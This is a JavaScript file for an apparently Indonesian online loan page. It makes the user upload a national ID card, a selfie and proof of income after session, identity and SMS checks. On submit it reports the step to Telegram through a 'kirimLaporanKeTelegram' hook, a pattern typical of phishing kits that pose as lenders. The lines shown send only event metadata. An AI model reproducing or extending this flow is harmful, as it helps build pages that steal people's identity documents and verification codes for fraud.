(() => {
  if (!NovaStorage.requireSession()) return;
  if (!NovaStorage.requireIdentity()) return;
  if (!NovaStorage.requireSmsVerification()) return;

  const ids = ['ktp','selfie','income'];
  const button = document.getElementById('continueButton');
  const statuses = {ktp:'ktpStatus',selfie:'selfieStatus',income:'incomeStatus'};

  const update = () => {
    const valid = ids.every(id => document.getElementById(id).files.length > 0);
    button.disabled = !valid;
  };

  ids.forEach(id => {
    document.getElementById(id).addEventListener('change', event => {
      const file = event.target.files[0];
      document.getElementById(statuses[id]).textContent = file ? file.name : 'Belum dipilih';
      update();
    });
  });

  document.getElementById('documentForm').addEventListener('submit', event => {
    event.preventDefault();
    if (button.disabled) return;
    NovaStorage.setDocumentsCompleted(true);
    window.kirimLaporanKeTelegram?.({
      event: 'DOCUMENTS_SUBMITTED',
      page: 'upload-dokumen.html',
      status: 'DOCUMENTS_COMPLETED'
    });
    window.location.replace('form-pinjaman.html');
  });

  document.getElementById('backButton').addEventListener('click', () => history.back());
})();
